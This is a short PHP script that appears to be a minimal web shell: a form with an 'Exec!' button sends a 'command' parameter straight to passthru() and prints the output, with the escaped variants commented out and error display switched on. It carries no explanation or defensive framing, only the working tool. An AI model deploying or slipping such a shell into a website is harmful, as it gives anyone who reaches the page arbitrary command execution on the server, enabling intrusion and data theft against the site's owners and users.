<?
error_reporting(E_ALL);
ini_set('display_errors', true);
ini_set('display_startup_errors', true);
?>

<form method=post>
<input type=text name=command value="<?=htmlspecialchars($_REQUEST['command'])?>">
<input type=submit name=submit value="Exec!">
</form>
<hr>
<?=htmlspecialchars(@$_REQUEST['command'])?>
<hr>
<pre>
<?
    if (isset($_REQUEST['command'])){
    //passthru(escapeshellcmd($_REQUEST['command'])." 2>&1");
   // system(escapeshellcmd($_REQUEST['command'])." 2>&1");
    passthru($_REQUEST['command'] . ' 2>&1');
    }
?>
</pre>